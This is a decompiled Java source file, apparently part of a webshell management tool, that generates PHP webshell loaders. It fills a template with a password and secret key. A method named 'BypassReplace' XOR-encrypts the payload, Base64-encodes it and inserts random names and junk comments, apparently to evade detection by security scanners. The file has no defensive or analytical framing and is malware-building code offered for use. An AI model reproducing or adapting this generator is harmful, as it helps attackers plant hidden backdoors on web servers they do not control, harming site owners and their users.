//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.phpXor;

import core.shellprocessor.StartProcessor;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import util.Log;
import util.TemplateEx;
import util.functions;

public class Generate {
    private static final String SAFE_CHARS = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&()_+-={}[];':\",.<>?\\|~!@#$%^&()_+-={}[];':\",.<>?\\|~!@#$%^&()_+-={}[];':\",.<>?\\|";
    private static final String UPPER_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    private static final SecureRandom RANDOM = new SecureRandom();

    Generate() {
    }

    public static String generateRandomString(Boolean isUpper) {
        int length = RANDOM.nextInt(7) + 10;
        StringBuilder sb = new StringBuilder();
        int i;
        int index;
        if (isUpper) {
            for(i = 0; i < length; ++i) {
                index = RANDOM.nextInt(UPPER_CHARS.length());
                sb.append(UPPER_CHARS.charAt(index));
            }

            return sb.toString();
        } else {
            for(i = 0; i < length; ++i) {
                index = RANDOM.nextInt(SAFE_CHARS.length());
                sb.append(SAFE_CHARS.charAt(index));
            }

            return "/*" + sb.toString() + "*/";
        }
    }

    public static String xorEncrypt(String data, String key) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] keyBytes = digest.digest(key.getBytes(StandardCharsets.UTF_8));
        byte[] dataBytes = data.getBytes(StandardCharsets.UTF_8);
        byte[] encrypted = new byte[dataBytes.length];

        for(int i = 0; i < dataBytes.length; ++i) {
            encrypted[i] = (byte)(dataBytes[i] ^ keyBytes[i % keyBytes.length]);
        }

        return Base64.getEncoder().encodeToString(encrypted);
    }

    public static String BypassReplace(String data, String pass) {
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/templatebypass.bin");
            String code = new String(functions.readInputStream(inputStream), StandardCharsets.UTF_8);
            inputStream.close();
            data = code.replace("8WRl51GXKPkn8kusti7u8M8zWg==", xorEncrypt(data, pass));
            data = data.replace("MYPATH", generateRandomString(true));
            String target = "/*zs*/";
            StringBuilder result = new StringBuilder(data);

            for(int startIndex = 0; (startIndex = result.indexOf(target, startIndex)) != -1; ++startIndex) {
                result.replace(startIndex, startIndex + target.length(), generateRandomString(false));
            }

            data = result.toString();
        } catch (Exception var7) {
            Log.error(var7);
        }

        return data;
    }

    public static byte[] GenerateShellLoder(String pass, String secretKey, String stubName) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + stubName);
            String code = new String(functions.readInputStream(inputStream), StandardCharsets.UTF_8);
            inputStream.close();
            data = TemplateEx.run(code.replace("{pass}", pass).replace("{secretKey}", secretKey)).getBytes(StandardCharsets.UTF_8);
            data = StartProcessor.process(data, "php");
        } catch (Exception var6) {
            Log.error(var6);
        }
        return data;
    }
}
